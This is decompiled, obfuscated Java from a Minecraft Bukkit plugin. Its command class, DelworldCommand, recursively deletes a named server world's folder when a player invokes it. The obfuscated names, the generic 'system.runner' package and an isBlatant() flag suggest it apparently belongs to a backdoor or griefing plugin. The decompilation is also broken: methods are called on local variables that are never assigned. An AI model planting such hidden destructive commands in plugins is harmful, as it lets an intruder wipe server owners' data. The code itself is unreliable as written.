/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.World
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import java.io.File;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;

public class DelworldCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return true;
    }

    @Override
    public void execute(Core llllllllllllllIIlIIIIllIllllIlII, String llllllllllllllIIlIIIIllIllllIIll, String[] llllllllllllllIIlIIIIllIllllIIlI, Player llllllllllllllIIlIIIIllIllllIIIl) {
        if (llllllllllllllIIlIIIIllIllllIIlI.length <= 1) {
            llllllllllllllIIlIIIIllIllllIIIl.sendMessage(Settings.USAGE("delWorld <world>"));
        } else {
            DelworldCommand llllllllllllllIIlIIIIllIllllIlIl;
            World llllllllllllllIIlIIIIllIllllIllI = Bukkit.getWorld((String)llllllllllllllIIlIIIIllIllllIIlI[1]);
            if (llllllllllllllIIlIIIIllIllllIllI == null) {
                llllllllllllllIIlIIIIllIllllIIIl.sendMessage(Settings.PREFIX("This world doesn't exist"));
            } else if (llllllllllllllIIlIIIIllIllllIlIl.PREMIUM(llllllllllllllIIlIIIIllIllllIllI.getWorldFolder())) {
                llllllllllllllIIlIIIIllIllllIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Successfully deleted world ").append(Settings.RED).append(llllllllllllllIIlIIIIllIllllIllI.getName()))));
            } else {
                llllllllllllllIIlIIIIllIllllIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Failed to delete world ").append(Settings.RED).append(llllllllllllllIIlIIIIllIllllIllI.getName()))));
            }
        }
    }

    public DelworldCommand() {
        DelworldCommand llllllllllllllIIlIIIIllIlllllIll;
    }

    public boolean PREMIUM(File llllllllllllllIIlIIIIllIlllIIlII) {
        if (llllllllllllllIIlIIIIllIlllIIlII.exists()) {
            File[] llllllllllllllIIlIIIIllIlllIIllI = llllllllllllllIIlIIIIllIlllIIlII.listFiles();
            for (int llllllllllllllIIlIIIIllIlllIIlll = 0; llllllllllllllIIlIIIIllIlllIIlll < llllllllllllllIIlIIIIllIlllIIllI.length; ++llllllllllllllIIlIIIIllIlllIIlll) {
                if (llllllllllllllIIlIIIIllIlllIIllI[llllllllllllllIIlIIIIllIlllIIlll].isDirectory()) {
                    DelworldCommand llllllllllllllIIlIIIIllIlllIIlIl;
                    llllllllllllllIIlIIIIllIlllIIlIl.PREMIUM(llllllllllllllIIlIIIIllIlllIIllI[llllllllllllllIIlIIIIllIlllIIlll]);
                    continue;
                }
                llllllllllllllIIlIIIIllIlllIIllI[llllllllllllllIIlIIIIllIlllIIlll].delete();
            }
        }
        return llllllllllllllIIlIIIIllIlllIIlII.delete();
    }
}

